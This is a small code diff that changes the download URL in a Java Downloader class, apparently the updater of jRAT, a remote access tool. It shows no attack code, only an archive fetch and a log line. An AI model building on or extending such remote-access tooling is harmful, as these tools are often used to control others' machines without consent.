@@ -12,7 +12,7 @@ import java.util.zip.ZipInputStream;
 
 public class Downloader {
 
-	public static final String URL = "https://jrat.se/downloads/jrat-archive.zip";
+	public static final String URL = "https://jrat.io/downloads/jrat-archive.zip";
 
 	public void update() throws Exception {
 		Logger.log("Downloading " + URL);
